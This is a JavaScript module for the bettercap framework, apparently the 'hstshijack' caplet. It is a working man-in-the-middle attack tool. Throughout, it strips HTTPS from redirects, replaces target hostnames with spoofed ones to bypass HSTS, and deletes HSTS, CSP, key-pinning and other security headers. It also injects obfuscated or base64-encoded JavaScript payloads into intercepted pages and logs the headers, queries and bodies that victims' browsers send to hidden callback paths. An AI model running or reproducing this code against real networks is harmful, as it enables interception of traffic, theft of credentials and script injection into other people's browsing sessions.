
/* Declare variables */

var ssl_log = [],
    whitelist = {}

var payload,
    payload_path,
    payload_container = new String(
    	"if (!{{session_id}}) {\n" + 
    		"var {{session_id}} = function() {\n" + 
    			"{{variables}}\n" + 
				"{{payload}}\n" + 
				"{{custom_payload}}\n" + 
    		"}\n" + 
    		"{{session_id}}();\n" + 
    	"}\n")

var ignore_hosts       = [],
    target_hosts       = [],
    replacement_hosts  = [],
    block_script_hosts = [],
    custom_payloads

var obfuscate,
    encode

var callback_path,
    whitelist_path,
    ssl_log_path,
    session_id,
    var_target_hosts,
    var_replacement_hosts

var math_seed

var red      = "\033[31m",
    yellow   = "\033[33m",
    green    = "\033[32m",
    blue     = "\033[34m",
    on_white = "\033[47;30m",
    on_grey  = "\033[40;37m",
    bold     = "\033[1;37m",
    reset    = "\033[0m"

/* Declare functions */

function randomFloat() {
	r = Math.sin(math_seed++) * 10000
	return r - Math.floor(r)
}

function randomString(length) {
	var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
	    buff  = ""
	while (buff.length < length) {
		index = parseInt( Math.random() * chars.length )
		buff = buff + chars.charAt(index)
	}
	return buff
}

function toRegexp(string) {
	string = string.replace(/\./g, "\\.")
	string = string.replace(/\-/g, "\\-")
	return new RegExp("([^a-z0-9\\-\\.]|^)" + string + "([^a-z0-9\\-\\.]|$)", "ig")
}

function toWholeRegexp(string) {
	string = string.replace(/\./g, "\\.")
	string = string.replace(/\-/g, "\\-")
	return new RegExp("^" + string + "$", "ig")
}

function toWildcardRegexp(string) {
	string = string.replace(/\-/g, "\\-")
	string = string.replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
	string = string.replace(/\./g, "\\.")
	return new RegExp(string + "([^a-z0-9\\-\\.]|$)", "ig")
}

function toWholeWildcardRegexp(string) {
	string = string.replace(/\-/g, "\\-")
	string = string.replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)")
	string = string.replace(/\./g, "\\.")
	return new RegExp("^" + string + "$", "ig")
}

function configure() {
	// Read caplet.
	env["hstshijack.payload"]        ? payload_path       = env["hstshijack.payload"].replace(/\s/g, "")                   : log_fatal("[" + green + "hstshijack" + reset + "] No hstshijack.payload specified.")
	env["hstshijack.ignore"]         ? ignore_hosts       = env["hstshijack.ignore"].replace(/\s/g, "").split(",")         : ignore_hosts       = []
	env["hstshijack.targets"]        ? target_hosts       = env["hstshijack.targets"].replace(/\s/g, "").split(",")        : target_hosts       = []
	env["hstshijack.replacements"]   ? replacement_hosts  = env["hstshijack.replacements"].replace(/\s/g, "").split(",")   : replacement_hosts  = []
	env["hstshijack.blockscripts"]   ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")   : block_script_hosts = []
	env["hstshijack.custompayloads"] ? custom_payloads    = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",") : custom_payloads    = []
	env["hstshijack.obfuscate"]      ? obfuscate          = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase()   : obfuscate          = false
	env["hstshijack.encode"]         ? encode             = env["hstshijack.encode"].replace(/\s/g, "").toLowerCase()      : encode             = false

	// Validate caplet.
	target_hosts.length < replacement_hosts.length ? log_fatal("[" + green + "hstshijack" + reset + "] Too many hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.length > replacement_hosts.length ? log_fatal("[" + green + "hstshijack" + reset + "] Not enough hstshijack.replacements (got " + replacement_hosts.length + ").") : ""
	target_hosts.indexOf("*") != -1                 ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.targets value (got *).") : ""
	replacement_hosts.indexOf("*") != -1            ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.replacements value (got *).") : ""
	for (var i = 0; i < ignore_hosts.length; i++) {
		if (ignore_hosts[i] != "*") {
			!ignore_hosts[i].match(/^(?:\*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.ignore value (got " + ignore_hosts[i] + ").") : ""
		}
	}
	for (var i = 0; i < target_hosts.length; i++) {
		!target_hosts[i].match(/^(?:\*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.targets value (got " + target_hosts[i] + ").") : ""
	}
	for (var i = 0; i < replacement_hosts.length; i++) {
		!replacement_hosts[i].match(/^(?:\*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.replacements value (got " + replacement_hosts[i] + ").") : ""
	}
	for (var i = 0; i < block_script_hosts.length; i++) {
		!block_script_hosts[i].match(/^(?:\*$|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})))$/ig) ? log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.blockscripts value (got " + block_script_hosts[i] + ").") : ""
	}
	if (obfuscate == "false") {
		obfuscate = false
	}
	if (encode == "false") {
		encode = false
	}
	// Preload custom payloads.
	p = {}
	for (var a = 0; a < custom_payloads.length; a++) {
		if ( !custom_payloads[a].match(/^(?:\*|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+?$/) ) {
			log_fatal("[" + green + "hstshijack" + reset + "] Invalid hstshijack.custompayloads value (got " + custom_payloads[a] + ").")
		}

		host = custom_payloads[a].replace(/[:].*/, "")
		path = custom_payloads[a].replace(/.*[:]/, "")

		if ( !readFile(path) ) {
			log_error("[" + green + "hstshijack" + reset + "] Could not read a path in hstshijack.custompayloads (got " + path + ").")
		} else {
			custom_payload = readFile(path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)

			if (obfuscate) {
				obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
				for (var b = 0; b < obfuscation_variables.length; b++) {
					regexp = new RegExp(obfuscation_variables[b], "ig")
					custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
				}
			}

			if (p[host]) {
				p[host] = { "payload": p[host].payload + "\n" + custom_payload.replace(/\$/g, "$$$$$$$$") }
			} else {
				p[host] = { "payload": custom_payload.replace(/\$/g, "$$$$$$$$") }
			}
		}
	}
	custom_payloads = p
	// Read core payload.
	if ( !readFile(payload_path) ) {
		log_fatal("[" + green + "hstshijack" + reset + "] Could not read payload in " + bold + "hstshijack.payload" + reset + " (got " + payload_path + ").")
	}
	// Prepare core payload.
	payload = readFile(payload_path).replace(/\$/g, "$$$$$$$$")
	payload = payload_container.replace("{{payload}}", payload)
	payload = payload.replace(/\{\{session_id\}\}/g, session_id)
	payload = payload.replace("obf_path_whitelist", whitelist_path)
	payload = payload.replace("obf_path_callback", callback_path)
	payload = payload.replace("obf_path_ssl_log", ssl_log_path)
	payload = payload.replace( "{{variables}}", "{{variables}}\nvar " + var_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"]\n" )
	payload = payload.replace( "{{variables}}", "var " + var_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"]" )
	payload = payload.replace(/obf_var_replacement_hosts/g, var_replacement_hosts)
	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
	// Obfuscate core payload.
	if (obfuscate) {
		obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
		for (var i = 0; i < obfuscation_variables.length; i++) {
			regexp = new RegExp(obfuscation_variables[i], "ig")
			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
		}
	}

	// Ensure targeted hosts are in SSL log.
	for (var i = 0; i < target_hosts.length; i++) {
		target = target_hosts[i]
		if ( !target.match(/^\*/) ) {
			if ( ssl_log.indexOf(target) == -1 ) {
				ssl_log.push(target)
				writeFile( env["hstshijack.log"], ssl_log.join("\n") )
				env["hstshijack.log"] ? log_debug("[" + green + "hstshijack" + reset + "] Saved " + target + " to SSL log.") : ""
			}
		}
	}
}

function showModule() {
	// Print module information on screen
	logStr  = "\n"
	logStr += "  " + bold + "Commands" + reset + "\n"
	logStr += "\n"
	logStr += "    " + bold + "hstshijack.show" + reset + " : Show module info.\n"
	logStr += "\n"
	logStr += "  " + bold + "Caplet" + reset + "\n"
	logStr += "\n"
	logStr += "    " + yellow + "           hstshijack.log" + reset + " > " + ( env["hstshijack.log"] ? green + env["hstshijack.log"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       hstshijack.payload" + reset + " > " + green + env["hstshijack.payload"] + reset + "\n"
	logStr += "    " + yellow + "        hstshijack.ignore" + reset + " > " + ( env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined" ) + reset + "\n"
	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
	logStr += "    " + yellow + "        hstshijack.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
	logStr += "    " + yellow + "hstshijack.custompayloads" + reset + " > "
	if ( env["hstshijack.custompayloads"] ) {
			list = env["hstshijack.custompayloads"].replace(/\s/g, "").split(",")
			logStr += green + list[0] + reset + "\n"
			if (list.length > 1) {
				for ( var i = 0; i < (list.length-1); i++ ) {
					logStr += "                              > " + green + list[i+1] + reset + "\n"
				}
			}
	} else {
		logStr += red + "undefined" + reset + "\n"
	}
	logStr += "\n"
	logStr += "  " + bold + "Session info" + reset + "\n"
	logStr += "\n"
	logStr += "    " + bold + "     Session ID" + reset + " : " + session_id + "\n"
	logStr += "    " + bold + "  Callback Path" + reset + " : /" + callback_path + "\n"
	logStr += "    " + bold + " Whitelist Path" + reset + " : /" + whitelist_path + "\n"
	logStr += "    " + bold + "   SSL Log Path" + reset + " : /" + ssl_log_path + "\n"
	logStr += "    " + bold + "        SSL Log" + reset + " : " + ssl_log.length + " host" + (ssl_log.length == 1 ? "" : "s") + "\n"
	console.log(logStr)
}

function onCommand(cmd) {
	if (cmd == "hstshijack.show") {
		showModule()
		return true
	}
}

function onLoad() {
	math_seed = new Date().getMilliseconds()
	Math.random = function() { return randomFloat() }

	log_info("[" + green + "hstshijack" + reset + "] Generating random variable names for this session ...")
	session_id            = randomString( 4 + Math.random() * 12 )
	callback_path         = randomString( 4 + Math.random() * 12 )
	whitelist_path        = randomString( 4 + Math.random() * 12 )
	ssl_log_path          = randomString( 4 + Math.random() * 12 )
	var_target_hosts      = randomString( 4 + Math.random() * 12 )
	var_replacement_hosts = randomString( 4 + Math.random() * 12 )

	log_info("[" + green + "hstshijack" + reset + "] Reading SSL log ...")
	if ( !readFile( env["hstshijack.log"] ) ) {
		log_info("[" + green + "hstshijack" + reset + "] No SSL log file found, creating one now ...")
		writeFile(env["hstshijack.log"], "")
	}
	ssl_log = readFile( env["hstshijack.log"] ).split("\n")

	log_info("[" + green + "hstshijack" + reset + "] Reading caplet ...")
	configure()

	log_info("[" + green + "hstshijack" + reset + "] Module loaded.")
	showModule()
}

function onRequest(req, res) {

	ignored = false

/* Handle special callbacks */

	if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {

		// SSL log callback
		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
		if (req.Path == "/" + ssl_log_path) {
			queried_host = atob(req.Query)
			log_debug("[" + green + "hstshijack" + reset + "] Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
			for (var i = 0; i < target_hosts.length; i++) {
				var regexp
				if ( target_hosts[i].indexOf("*") != -1 ) {
					regexp = toWholeWildcardRegexp(target_hosts[i])
				} else {
					regexp = toWholeRegexp(target_hosts[i])
				}
				if ( queried_host.match(regexp) ) {
					if ( ssl_log.indexOf(queried_host) == -1 ) {
						log_debug("[" + green + "hstshijack" + reset + "] Learning HTTP response from " + queried_host + " ...")
						req.Hostname = queried_host
						req.Path     = "/"
						req.Query    = ""
						req.Body     = ""
						req.Method   = "HEAD"
					}
					break
				}
			}
		}

		// Basic callback
		// Requests made for this path will print sniffed data.
		// Requests made for this path will not be proxied.
		if (req.Path == "/" + callback_path) {
			log_info("[" + green + "hstshijack" + reset + "] Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"

			logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n"
			headers = req.Headers.split("\r\n")
			for (var i = 0; i < headers.length; i++) {
				if ( headers[i].split(": ").length == 2 ) {
					params = headers[i].split(": ")
					logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
				} else {
					logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n"
				}
			}

			logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n"
			queries = req.Query.split("&")
			for (var i = 0; i < queries.length; i++) {
				if ( queries[i].split("=").length == 2 ) {
					params = queries[i].split("=")
					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
				} else {
					logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n"
				}
			}

			logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"

			console.log(logStr)

			req.Scheme = "ignore"
		}

		// Whitelist callback
		// Requests made for this path will print sniffed data.
		// Requests made for this path will not be proxied.
		// Requests made for this path will stop all attacks towards this client for the requested hostname.
		if (req.Path == "/" + whitelist_path) {
			log_info("[" + green + "hstshijack" + reset + "] Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)

			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"

			logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n"
			headers = req.Headers.split("\n")
			for (var i = 0; i < headers.length; i++) {
				if ( headers[i].split(": ").length == 2 ) {
					params = headers[i].split(": ")
					logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
				} else {
					logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n"
				}
			}

			logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n"
			queries = req.Query.split("&")
			for (var i = 0; i < queries.length; i++) {
				if ( queries[i].split("=").length == 2 ) {
					params = queries[i].split("=")
					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
				} else {
					logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n"
				}
			}

			logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"

			console.log(logStr)

			req.Scheme = "ignore"
			// Add requested hostname (spoofed and/or original) to whitelist
			if (whitelist[req.Client]) {
				whitelisted_hosts = whitelist[req.Client].split(",")
				if ( whitelisted_hosts.indexOf(req.Hostname) == -1 ) {
					whitelisted_hosts += "," + req.Hostname
				}
			} else {
				whitelist[req.Client] = req.Hostname
			}
			// Also add (wildcard) targets and replacements for requested hostname
			for (var i = 0; i < target_hosts.length; i++) {
				var regexp_targets,
				    regexp_replacements
				if ( target_hosts.indexOf("*") != -1 ) {
					regexp_targets      = toWholeWildcardRegexp(target_hosts[i])
					regexp_replacements = toWholeWildcardRegexp(replacement_hosts[i])
				} else {
					regexp_targets      = toWholeRegexp(target_hosts[i])
					regexp_replacements = toWholeRegexp(replacement_hosts[i])
				}
				if ( req.Hostname.match(regexp_targets) || req.Hostname.match(regexp_replacements) ) {
					whitelist[req.Client] += "," + replacement_hosts[i]
					whitelist[req.Client] += "," + target_hosts[i]
				}
			}
		}

	} else {

	/* Attack or ignore request */

		// Redirect client to the real host if a whitelist callback was received.
		if (whitelist[req.Client]) {
			whitelisted_hosts = whitelist[req.Client].split(",")
			for (var a = 0; a < whitelisted_hosts.length; a++) {
				var regexp
				if ( whitelisted_hosts[a].indexOf("*") != -1 ) {
					regexp = toWholeWildcardRegexp(whitelisted_hosts[a])
				} else {
					regexp = toWholeRegexp(whitelisted_hosts[a])
				}
				if ( req.Hostname.match(regexp) ) {
					// Restore requested hostname if it was spoofed
					var intended_host
					for (var b = 0; b < replacement_hosts.length; b++) {
						if ( replacement_hosts.indexOf("*") != -1 ) {
							regexp = toWholeWildcardRegexp(replacement_hosts[b])
						} else {
							regexp = toWholeRegexp(replacement_hosts[b])
						}
						if ( req.Hostname.match(regexp) ) {
							var replacement
							if (replacement_hosts[b].indexOf("*") != -1) {
								replacement = "$1" + target_hosts[b].replace("*.", "")
							} else {
								replacement = target_hosts[b]
							}
							intended_host = req.Hostname.replace(regexp, replacement)
							res.SetHeader( "Location", "https://" + intended_host + req.Path + ( req.Query != "" ? ("?" + req.Query) : "" ) )
							res.Status = 301
							break
						}
					}
					res.SetHeader("bettercap", "ignore")
					ignored = true
					log_info("[" + green + "hstshijack" + reset + "] Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
					break
				}
			}
		}

		if (!ignored) {

		/* Patch Request */

			// Patch spoofed hostnames.
			for (var a = 0; a < target_hosts.length; a++) {
				// Patch spoofed hostnames in headers.
				var regexp
				if ( replacement_hosts[a].indexOf("*") != -1 ) {
					regexp = toWildcardRegexp(replacement_hosts[a])
				} else {
					regexp = toRegexp(replacement_hosts[a])
				}
				if ( req.Headers.match(regexp) ) {
					req.Headers = req.Headers.replace( regexp, "$1" + target_hosts[a].replace("*.", "") + "$2" )
					log_debug("[" + green + "hstshijack" + reset + "] Patched spoofed hostname(s) in request header(s).")
				}

				// Patch spoofed hostname of request.
				if ( replacement_hosts[a].indexOf("*") != -1 ) {
					regexp = toWholeWildcardRegexp(replacement_hosts[a])
				} else {
					regexp = toWholeRegexp(replacement_hosts[a])
				}
				if ( req.Hostname.match(regexp) ) {
					spoofed_host = req.Hostname
					if ( replacement_hosts[a].indexOf("*") != -1 ) {
						req.Hostname = req.Hostname.replace( regexp, "$1" + target_hosts[a].replace("*.", "") )
					} else {
						req.Hostname = req.Hostname.replace(regexp, target_hosts[a])
					}
					req.Scheme   = "https"
					log_debug("[" + green + "hstshijack" + reset + "] Patched spoofed hostname " + bold + spoofed_host + reset + " to " + bold + req.Hostname + reset + " and set scheme to HTTPS.")
				}
			}

			// Patch SSL in headers if we know host uses SSL.
			for (var a = 0; a < ssl_log.length; a++) {
				regexp = new RegExp( "http://" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^a-z0-9\\-\\.]|$)", "ig" )
				if ( req.Headers.match(regexp) ) {
					req.Headers = req.Headers.replace(regexp, "https://" + ssl_log[a] + "$1")
					log_debug("[" + green + "hstshijack" + reset + "] Patched SSL of " + ssl_log[a] + " in request headers.")
				}
			}

			// Patch scheme of request if host is found in SSL log.
			if (req.Scheme != "https") {
				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
					req.Scheme = "https"
					log_debug("[" + green + "hstshijack" + reset + "] Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
				} else {
					for (var i = 0; i < target_hosts; i++) {
						var regexp
						if ( target_hosts[i].indexOf("*") != -1 ) {
							regexp = toWholeWildcardRegexp(target_hosts[i])
						} else {
							regexp = toWholeRegexp(target_hosts[i])
						}
						if ( req.Hostname.match(regexp) ) {
							req.Scheme = "https"
							log_debug("[" + green + "hstshijack" + reset + "] Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
						}
					}
				}
			}

		}

	}

}

function onResponse(req, res) {

/* Remember HTTPS redirects */

	// Write to SSL log.
	// Check if host responded with HTTPS redirection.
	location = res.GetHeader("Location", "")
	if ( location.match(/^https:\/\//i) ) {
		ssl_log = readFile( env["hstshijack.log"] ).split("\n")
		host    = location.replace(/https:\/\//, "").replace(/\/.*/, "")
		if ( ssl_log.indexOf(host) == -1 ) {
			ssl_log.push(host)
			writeFile( env["hstshijack.log"], ssl_log.join("\n") )
			log_debug("[" + green + "hstshijack" + reset + "] Saved " + host + " to SSL log.")
		}
	}

/* Attack or ignore response */

	ignored = false

	// Ignore this response if required.
	if ( res.GetHeader("bettercap", "") == "ignore" ) {
		res.RemoveHeader("bettercap")
		ignored = true
		log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
	} else {
		for (var a = 0; a < ignore_hosts.length; a++) {
			var regexp
			if ( ignore_hosts[a].indexOf("*") != -1 ) {
				regexp = toWholeWildcardRegexp(ignore_hosts[a])
			} else {
				regexp = toWholeRegexp(ignore_hosts[a])
			}
			if ( req.Hostname.match(regexp) ) {
				ignored = true
				// Don't ignore response if there's a replacement for the requested host.
				for (var b = 0; b < target_hosts.length; b++) {
					if ( target_hosts[b].indexOf("*") != -1 ) {
						regexp = toWholeWildcardRegexp(target_hosts[b])
					} else {
						regexp = toWholeRegexp(target_hosts[b])
					}
					if ( req.Hostname.match(regexp) ) {
						ignored = false
						break
					}
				}
				// Don't ignore response if there's a custom payload for the requested host.
				if (ignored) {
					for ( var b = 0; b < Object.keys(custom_payloads).length; b++ ) {
						custom_payload_host = Object.keys(custom_payloads)[b].replace(/\:.*/, "")
						if ( custom_payload_host.indexOf("*") != -1 ) {
							regexp = toWholeWildcardRegexp(custom_payload_host)
						} else {
							regexp = toWholeRegexp(custom_payload_host)
						}
						if ( req.Hostname.match(regexp) ) {
							ignored = false
							break
						}
					}
				}
				if (ignored) {
					log_debug("[" + green + "hstshijack" + reset + "] Ignored response from " + bold + req.Hostname + reset + ".")
				}
				break
			}
		}
	}

	if (!ignored) {
		res.ReadBody()

	/* Attack meta tag redirection */

		// SSLstrip meta tag redirection.
		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
			meta_tags = res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")(.*?)(\/\s*|)>/ig) || []
			for (var a = 0; a < meta_tags.length; a++) {
				log_debug("[" + green + "hstshijack" + reset + "] Found " + meta_tags.length + " meta tag(s) in the response body.")

				if ( meta_tags[a].match(/https:\/\//ig) ) {
					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
					res.Body.replace(meta_tags[a], replacement)
					log_debug("[" + green + "hstshijack" + reset + "] Stripped meta tag(s) from SSL.")
				}

				// Hijack hostnames in redirecting meta tags.
				for (var b = 0; b < target_hosts.length; b++) {
					// regexp  = new RegExp( target_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "([a-z0-9\\-]*\\.)") + "()", "ig" )
					var regexp
					if ( target_hosts[b].indexOf("*") != -1 ) {
						regexp = toWildcardRegexp(target_hosts[b])
					} else {
						regexp = toRegexp(target_hosts[b])
					}
					if ( meta_tags[a].match(regexp) ) {
						hijacked_meta_tag = "$1" + meta_tags[a].replace( regexp, replacement_hosts.replace("*.", "") ) + "$2"
						res.Body = res.Body.replace(meta_tags[a], hijacked_meta_tag)
						log_debug("[" + green + "hstshijack" + reset + "] Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
					}
				}
			}
		}

	/* JavaScript */

		// Block scripts on this host if required.
		for (var i = 0; i < block_script_hosts.length; i++) {
			var regexp
			if ( block_script_hosts[i].indexOf("*") != -1 ) {
				regexp = toWholeWildcardRegexp(block_script_hosts[i])
			} else {
				regexp = toWholeRegexp(block_script_hosts[i])
			}
			if ( req.Hostname.match(regexp) ) {
				res.Body = res.Body.replace(/<script.*?>/ig, "<div style=\"display:none;\">")
				res.Body = res.Body.replace(/<\/script>/ig, "</div>")
				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
					res.Body = ""
				}
				log_debug("[" + green + "hstshijack" + reset + "] Blocked script(s) from " + bold + req.Hostname + reset + ".")
				break
			}
		}

		// Inject payloads.
		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head[^>]*?>/i) ) {
			injection = payload

			for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
				host = Object.keys(custom_payloads)[a]

				var regexp

				if ( host.indexOf("*") != -1 ) {
					regexp = toWholeWildcardRegexp(host)
				} else {
					regexp = toWholeRegexp(host)
				}

				if ( req.Hostname.match(regexp) ) {
					injection = injection.replace("{{custom_payload}}", custom_payloads[host].payload + "\n{{custom_payload}}")
					log_debug("[" + green + "hstshijack" + reset + "] Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
				}
			}

			injection = injection.replace("{{custom_payload}}", "")

			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
				res.Body = injection.replace(/.*/g, injection) + res.Body // Replace once more to unescape "$$$$$$$$" to a single "$"
				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
			} else if ( res.Body.match(/<head[^>]*?>/i) ) {
				if (encode) {
					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + btoa(injection) + "\"></script>")
				} else {
					res.Body = res.Body.replace(/<head( [^>]*?|)>/i, "<head$1><script>" + injection + "</script>")
				}
				log_debug("[" + green + "hstshijack" + reset + "] Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
			}
		}

	/* Response headers */

		// SSLstrip location header.
		location = res.GetHeader("Location", "")
		if (location != "") {
			res.SetHeader( "Location", location.replace(/(http)s:\/\//i, "$1://") )
			log_debug("[" + green + "hstshijack" + reset + "] Stripped SSL from location header.")
		}

		// Replace hosts in headers.
		for (var a = 0; a < target_hosts.length; a++) {
			var regexp
			if ( target_hosts[a].indexOf("*") != -1 ) {
				regexp = toWildcardRegexp(target_hosts[a])
			} else {
				regexp = toRegexp(target_hosts[a])
			}
			if ( res.Headers.match(regexp) ) {
				res.Headers = res.Headers.replace( regexp, "$1" + replacement_hosts[a].replace("*.", "") + "$2" )
				log_debug("[" + green + "hstshijack" + reset + "] Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
			}
		}

		// Remove security headers.
		res.RemoveHeader("Strict-Transport-Security")
		res.RemoveHeader("Content-Security-Policy")
		res.RemoveHeader("Content-Security-Policy-Report-Only")
		res.RemoveHeader("Public-Key-Pins")
		res.RemoveHeader("Public-Key-Pins-Report-Only")
		res.RemoveHeader("X-Frame-Options")
		res.RemoveHeader("X-Content-Type-Options")
		res.RemoveHeader("X-WebKit-CSP")
		res.RemoveHeader("X-Content-Security-Policy")
		res.RemoveHeader("X-Download-Options")
		res.RemoveHeader("X-Permitted-Cross-Domain-Policies")
		res.RemoveHeader("X-XSS-Protection")
		res.RemoveHeader("Expect-Ct")

		// Set insecure headers.
		res.SetHeader("Access-Control-Allow-Origin", "*")
		res.SetHeader("Access-Control-Allow-Methods", "*")
		res.SetHeader("Access-Control-Allow-Headers", "*")
		res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate")
		res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT")
		res.SetHeader("Pragma", "no-cache")

	}

}
